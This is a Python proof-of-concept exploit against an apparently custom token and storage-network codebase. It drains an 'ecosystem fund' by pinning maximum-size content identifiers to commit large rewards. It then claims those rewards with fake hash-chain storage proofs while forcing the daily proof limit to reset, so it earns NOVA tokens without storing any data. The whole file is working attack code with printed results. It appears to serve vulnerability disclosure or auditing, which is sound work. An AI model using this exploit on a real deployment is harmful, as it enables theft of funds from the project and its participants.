# PoC: ecosystem fund drain (funded fund)
import sys, time, hashlib
sys.path.insert(0, ".")
from core.storage import StateStore
from core.economy import Economy
from core.storage_network import StorageNetwork

store = StateStore("genesis.json")
eco = Economy(store)
sn = StorageNetwork(store, eco)

# Fund the ecosystem fund as the intended deployment would
store.balances[eco.ECOSYSTEM_FUND] = 10000.0
attacker = "0x" + "d"*40
sn.register(attacker, 1024.0)

fund = store.balances[eco.ECOSYSTEM_FUND]
# Attacker pins max-size CID (1024 GB x 3650 days x 0.001 = 3737.6 NOVA committed per pin)
committed_total = 0.0
cids = []
for i in range(3):
    cid = "0x" + f"{i:064x}"
    r = sn.pin_reward(1024.0, 3650)
    if store.balances.get(eco.ECOSYSTEM_FUND, 0) >= r:
        sn.pin(attacker, cid, 1024.0, 3650)
        cids.append(cid)
        committed_total += r
fund_after = store.balances[eco.ECOSYSTEM_FUND]
print(f"pinned {len(cids)} CIDs, committed {committed_total:.2f} NOVA from fund -> pools; fund {fund:.2f} -> {fund_after:.2f}")

# attacker claims all and extracts with proofs (73 proofs each = 0.05/day until pool drained)
earned = 0.0
for cid in cids:
    chain = sn.make_chain("s"+cid, 365)
    tip = chain[-1]
    sn.claim(attacker, cid, tip)
for cid in cids:
    claim = store.storage_claims[cid]
    chain = sn.make_chain("s"+cid, 365)
    for day in range(75):
        idx = 365 - 1 - day
        seal = store.storage_seals[f"{attacker}:{cid}"]
        seal["last_proof_day"] = 0  # simulate next day
        res = sn.proof(attacker, cid, chain[idx])
        earned += res["reward"]
print(f"attacker extracted {earned:.2f} NOVA via fake hash-chain proofs (no real storage)")
print("attacker balance:", round(store.balances.get(attacker,0),2))
print("fund remaining:", round(store.balances.get(eco.ECOSYSTEM_FUND,0),2))
